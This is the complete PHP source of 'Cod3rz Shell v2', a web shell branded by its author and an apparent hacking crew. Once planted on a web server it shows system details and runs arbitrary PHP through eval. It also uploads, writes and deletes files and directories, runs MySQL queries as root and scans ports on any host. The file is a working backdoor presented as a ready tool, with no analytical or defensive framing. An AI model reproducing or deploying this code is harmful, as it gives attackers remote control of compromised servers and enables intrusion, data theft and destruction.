<?php
 
/*********************************************************************
 *                       :: Cod3rz Shell v2 ::                       *
 *********************************************************************
 *             _              * Author : Cod3rZ                      *
 *  __ ___  __| |___ _ _ ___  * Site   : http://cod3rz.helloweb.eu   *
 * / _/ _ \/ _` / -_) '_|_ /  * Email  : songforthemoment@hotmail.it *
 * \__\___/\__,_\___|_| /__|  * Email  : songforthemoment@yahoo.it   *
 *********************************************************************
 *                   This program is free software                   *
 *********************************************************************
 *               Last Update: [09/12/2007] [dd/mm/yyyy]              *
 *********************************************************************
 *                       - Thanks to n3tfr33 -                       *
 *********************************************************************
 */
 
// Variables
 
	$info = @$_SERVER['SERVER_SOFTWARE'];
	$site = getenv("HTTP_HOST");
	$uname = php_uname();
	$smod = ini_get('safe_mode');
           if ($smod == 0) { $safemode = "<font color='lightgreen'>OFF</font>"; }
           else { $safemode = "<font color='red'>ON</font>";      }
	$dir = @$_POST['dir'];
	$mkdir = @$_POST['makedir'];
	$mydir = @$_POST['deletedir'];
	$cmd = @$_GET['cmd'];
	$host = @$_POST['host'];
	$proto = @$_POST['protocol'];
	$delete = @$_POST['delete'];
	$phpeval = @$_POST['php_eval'];
	$db = @$_POST['db'];
	$query = @$_POST['query'];
	$user = 'root';
	$pass = '';
	$myports = array("21","22","23","25","59","80","113","135","445","1025","5000","5900","6660","6661","6662","6663","6665","6666","6667","
 
6668","6669","7000","8080","8018");
	$quotes = get_magic_quotes_gpc();
if ($quotes == "1" or $quotes == "on") 
	{
		 $quot = "<font color='red'>ON</font>";
	}
	else 
	{
		 $quot = "<font color='lightgreen'>OFF</font>";
	}
	$spacedir = @getcwd();
	$free = @diskfreespace($spacedir);
if (!$free) {$free = 0;}
	$all = @disk_total_space($spacedir);
if (!$all) {$all = 0;}
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
 
 
// PHPinfo
if($cmd == 'phpinfo')
{
phpinfo();
die();
}
 
 
// Make File
 
	$name = htmlspecialchars(@$_POST['names']);
	$src = @$_POST['source'];
    if(isset($name) && isset($src))
      {
	$ctd = fopen($name,"w+"); 
	fwrite($ctd, $src);
	fclose($ctd);
	echo "<script>alert('$name uploaded')</script>"; 
      }
 
// Upload File
	$path = @$_FILES['ffile']['tmp_name'];
	$name = @$_FILES['ffile']['name'];
	if(isset($path) && isset($name))
{
	if (move_uploaded_file($path, $name))
	{
		echo "<script>alert('$name uploaded')</script>";
	}
	else 
	{ 
		echo "<script>alert('Error')</script>"; 
}	}
 
// Delete File
 
 
	if(isset($delete) && $delete != $path)
{
		if(file_exists($delete)) 
		{
			unlink($delete);
			echo "<script>alert('File Deleted')</script>"; 
		}
 
}
// PHP Code
/*if(isset($phpeval)) {
 $eval = @str_replace("<?","",$_POST['php_eval']);
 $eval = @str_replace("?>","",$eval);
 @eval($eval);
}*/
 
// Database 
 
	if(isset($db) && isset($query))
{
	$mysql = mysql_connect("localhost", $user, $pass)or die("<script>alert('Connessione Non Effettuata')</script>");
	$db = mysql_select_db($db)or die(mysql_error());
	$queryz = mysql_query($query)or die(mysql_error());
if($query) { echo "<script>alert('Done')</script>"; }
else { echo "<script>alert('Error')</script>"; }
} 
 
// Make Dir
if(isset($mkdir)) {
mkdir($mkdir);
if($mkdir) { echo "<script>alert('Done')</script>"; } }
 
// Delete Directory
 
if(isset($mydir) && $mydir != "$path") {
$d = dir($mydir); 
while($entry = $d->read()) { 
 if ($entry !== "." && $entry !== "..") { 
 unlink($entry); 
 } 
} 
$d->close(); 
rmdir($mydir);  
 
}
 
//File List
 
	if(!isset($dir)) { $dir = "."; }
 
	$pahtw = 0;
	$filew = 0;
	if (is_dir($dir)) 
	{
		if ($open = opendir($dir)) 
		{
			while (($list = readdir($open)) !== false) 
			{
			if($list != "." && $list != "..") 
{             
			if(is_dir($list)) { 
	$typezz = "DIR"; 
	$pahtw++; 
	@$listf.= '<tr><td><a href="'.$list.'">[ '.$list.' ]</a><br></td><td>' . $typezz . '</td><td></td><td>' . substr(sprintf('%o', fileperms($list)), -4) . '</tr>'; }
else {
 
	$lolx = filesize($list);
	$typezz = "FILE";
	$filew++;	
	@$listf.= '<tr><td> <a href="'.$list.'"> '.$list.' </a><br></td><td>' . $typezz . '</td><td width=15%>' . $lolx .'</td><td>' . substr(sprintf('%o', fileperms($list)), -4) . '</tr>'; }  }
	}			
 
 
	closedir($open);
 
		} 
$fileq = $pahtw + $filew;   }
 
 
 
 
 
echo "
<html>
<head><title>$site - Cod3rz</title>
<style>
table.sample {
	border-width: 1px;
	border-spacing: 1px;
	border-style: solid;
	border-color: #a6a6a6;
	border-collapse: separate;
	background-color: rgb(98, 97,97);
}
table.sample td {
	border-width: 1px;
	padding: 1px;
	border-style: none;
	border-color: #a6a6a6;
	background-color: #000000;
	-moz-border-radius: 0px;
}
input,textarea,select {
font: normal 11px Verdana, Arial, Helvetica, sans-serif;
background-color:black;
color:#a6a6a6;
border: solid 1px #363636;
}
</style>
</head>
<body bgcolor='#000000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
<center>
<b><font size='6' face='Webdings'>!</font>
<font face='Verdana' size='5'><a href='http://cod3rz.helloweb.eu'>Cod3rz Shell</font></a>
<font size='6' face='Webdings'>!</font></b>
</center>
<hr>
<p align='left'>
<font size='2' face='Verdana'><b>
Site:  $site <br>
Server Name: " . $_SERVER['SERVER_NAME'] . " <br>
Software:  $info <br>
Uname -a: $uname <br>
Path: " . $_SERVER['DOCUMENT_ROOT'] . " <br>
Safe Mode:  $safemode <br>
Magic Quotes : $quot <br>
Free Space: " . view_size($free) . " <br>
Total Space: " . view_size($all) . " <br>
 
<a href='?cmd=phpinfo' target='_blank'>View PhpInfo</a></p>
<hr>
<center><font size='1'> :: Total Files: $fileq [$filew files and $pahtw directory] ::</font></center>
<hr><center><table class=sample width=100%>
<font size='1'>
<td><b>File Name:</b></td><td><b>Type:</b></td><td width=15%><b>Size:</b></td><td width=10%><b>Perms:</b></td>$listf</font>
</table></center>
<br>
<table class='sample' cellspacing='0' cellpadding='0' border='0' width='100%'><td>
<center><b><font size='2' face='Verdana'>:: Eval PHP code ::<br></font></b>";
if(!isset($phpeval))
{
echo "
	<form method='post' action=''>
	<textarea name=php_eval cols=100 rows=5></textarea><br>
	<input type='submit' value='Execute!'>
	</form>
";
}
 
if(isset($phpeval)) {
echo "
<form method='post' action=''>
<textarea name=php_eval cols=100 rows=10>";
 $eval = @str_replace("<?","",$phpeval);
 $eval = @str_replace("?>","",$eval);
 @eval($phpeval);
echo "</textarea><br><input type='submit' value='Execute!'></form>";
 
}
echo "</center></td></table>";
echo "
<table class='sample' cellspacing='0' cellpadding='0' border='0' width='100%'>
<tr>
<td>
<center><b><font size='2' face='Verdana'>:: Go Dir ::<br></font></b>
<form name='directory' method='post' action=''>
<input type='text' name='dir' value=$path> 
<input type='submit' value='Go'>
</form></td>
<td>
<center><b><font size='2' face='Verdana'>:: Port Scanner ::<br></font></b>
	<form name='scanner' method='post'>
	<input type='text' name='host' value='127.0.0.1' >
	<select name='protocol'>
	<option value='tcp'>tcp</option>
	<option value='udp'>udp</option>
	</select>
	<input type='submit' value='Scan Ports'>
	</form>";
if(isset($host) && isset($proto))
{
echo "<strong>Open Ports:</strong>";
 
for($current = 0; $current <= 23; $current++)
{
$currents = $myports[$current];
 
$service = getservbyport($currents, $proto);
 
 
// Try to connect to port
$result = fsockopen($host, $currents, $errno, $errstr, 1);
 
// Show results
if($result)
{
echo "$currents, ";
}
 
 
}
}
 
echo "
</td></tr>
 
<tr>
<td width=50%>
<center><b><font size='2' face='Verdana'>:: Upload Files ::<br></font></b>
	<form method='post' action='' enctype='multipart/form-data'>
	<input type='file' name='ffile'>
	<input type='submit' name='ok' value='Upload File'>
	</center>	
	</form>
</td>
<td>
<center><b><font size='2' face='Verdana'>:: Delete Files ::<br></font></b>
	<form method='post' action=''>
	<input type='text' name='delete' value=$path > <input type='submit' value='Delete file'>
	</center>
	</form>
</td></tr>
<tr>
<td>
<center><b><font size='2' face='Verdana'>:: Make Directory ::<br></font></b>
	<form method='post' action=''>
	<input type='text' name='makedir'> <input type='submit' value='Make'>
	</center>
	</form>
</td>
<td>
<center><b><font size='2' face='Verdana'>:: Delete Directory ::<br></font></b>
	<form method='post' action=''>
	<input type='text' name='deletedir' value=$path> <input type='submit' value='Delete'>
	</center>
	</form>
</td></tr>
<tr>
<td width=50%>
<center><b><font size='2' face='Verdana'>:: Make File ::<br></font></b>
	<form method='post' action=''>
	<font size='1'>Title:</font><br>
	<input type='text' name='names' size='30'><br>
	<font size='1'>Source:</font><br>
	<textarea rows='10' cols='30' name='source'></textarea><br>
	<input type='submit' value='Upload'>
	</center>
	</form>
</td>
<td width=50%>
<center><b><font size='2' face='Verdana'>:: Send Query ::<br></font></b>
	<form method='post' action=''>
	<font size='1'>DB Name:</font><br>
	<input type='text' name='db' size='30'><br>
	<font size='1'>Query:</font><br>
	<textarea rows='10' cols='30' name='query'></textarea><br>
	<input type='submit' value='Go'>
	</center>
	</form>
</td></tr>
 
</table>
<br />
<table class='sample' cellspacing='0' cellpadding='0' border='0' width='100%'>
<tr>
<td>
<center><b><font size='1'>
:: Powered by Cod3rz - Devils Night Crew - <a href='http://cod3rz.helloweb.eu'>http://cod3rz.helloweb.eu</a> - <a href='http://devilsnight.altervista.org'>http://devilsnight.altervista.org</a> - v2.0 ::
</center></font></td></tr>
";
 
?>